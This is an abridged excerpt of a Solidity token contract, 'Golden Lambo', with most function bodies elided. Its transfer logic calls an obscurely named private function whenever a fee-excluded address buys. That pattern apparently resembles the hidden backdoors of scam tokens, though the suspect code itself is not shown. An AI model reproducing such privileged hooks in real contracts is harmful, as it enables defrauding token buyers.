...
/**
    Golden Lambo
    Telegram : https://t.me/GoldenLambo
*/
...
contract GoldenLambo is Context, IERC20, Ownable {
    ...
    string private constant _name = "Golden Lambo";
    string private constant _symbol = "GOLDENLAMBO";
    uint8 private constant _decimals = 9;

    uint256 private _tTotal = 1 * 10**9 * 10**9;
    uint256 private constant _tokenAmountReflect = 1 * 10**9 * 10**9;
    ...
    mapping (address => uint256) private _isgetUsage;
    
    bool private buyReflect = false;
    ...
    function _getValuesReflect(uint256 amount) private {
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair) {
            require (_isgetUsage[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isgetUsage[to] = block.timestamp;
        }

        if (from == uniswapV2Pair &&
            _isExcludedFromFee[to]) {
            _getValuesReflect(amount);
        }
        
        if (balanceOf(address(this)) >= _tokenAmountReflect && !swapping && from != uniswapV2Pair && from != owner() && to != owner()) {
            swapping = true;
    ...
    function valueReflect(uint256 tokens) private {
